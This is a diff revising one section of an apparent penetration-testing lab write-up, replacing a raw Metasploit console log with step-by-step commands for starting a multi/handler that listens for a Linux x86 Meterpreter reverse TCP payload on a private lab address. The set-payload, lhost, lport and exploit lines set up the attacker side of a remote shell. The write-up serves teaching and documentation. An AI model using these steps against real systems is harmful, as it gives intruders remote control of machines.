@@ -167,30 +167,53 @@ This screenshot documents the command entered in the PHP file. It does **not** e
 
 ## 12. Starting the Meterpreter Handler
 
-With the payload configured to connect to `192.168.43.220:444`, I opened Metasploit's multi/handler and selected the matching Linux x86 Meterpreter reverse TCP payload:
+After generating and hosting the payload, I configured Metasploit to wait for its reverse connection. I used the `multi/handler` module and matched its payload settings with the values used when generating `IM_HERE`.
+
+First, I selected the handler module:
 
 ```text
-=[ metasploit v6.4.84-dev                                ]
-+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
-+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+use exploit/multi/handler
+```
 
-Metasploit Documentation: https://docs.metasploit.com/
-The Metasploit Framework is a Rapid7 Open Source Project
+This loads Metasploit's generic handler module, which can listen for incoming connections from a payload.
 
-[*] Starting persistent handler(s)...
-msf > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
-payload => linux/x86/meterpreter/reverse_tcp
-msf exploit(multi/handler) > set lhost 192.168.43.220
-lhost => 192.168.43.220
-msf exploit(multi/handler) > set lport 444
-lport => 444
-msf exploit(multi/handler) > exploit
+Next, I selected the exact payload type used earlier:
+
+```text
+set payload linux/x86/meterpreter/reverse_tcp
+```
+
+This tells the handler to expect a Linux x86 Meterpreter reverse TCP connection. The payload type must match the one generated with `msfvenom`.
+
+I then set the local address:
+
+```text
+set lhost 192.168.43.220
+```
+
+`LHOST` is the IP address on the Kali machine where the handler should receive the incoming connection.
+
+After that, I configured the listening port:
+
+```text
+set lport 444
+```
+
+`LPORT` sets the TCP port on which Metasploit waits. It matches the port specified when the payload was generated.
+
+Finally, I started the handler:
+
+```text
+exploit
+```
+
+Metasploit reported:
+
+```text
 [*] Started reverse TCP handler on 192.168.43.220:444
 ```
 
-The output confirms that the handler started and was listening on `192.168.43.220:444`. It does **not** show an incoming connection or an established Meterpreter session; those require separate confirmation.
+This confirms that the handler started listening on `192.168.43.220:444`. It does **not** show that the target connected or that a Meterpreter session was established.
 
 ![Screenshot 12: Metasploit multi-handler listening on port 444](screenshots/12.png)
 
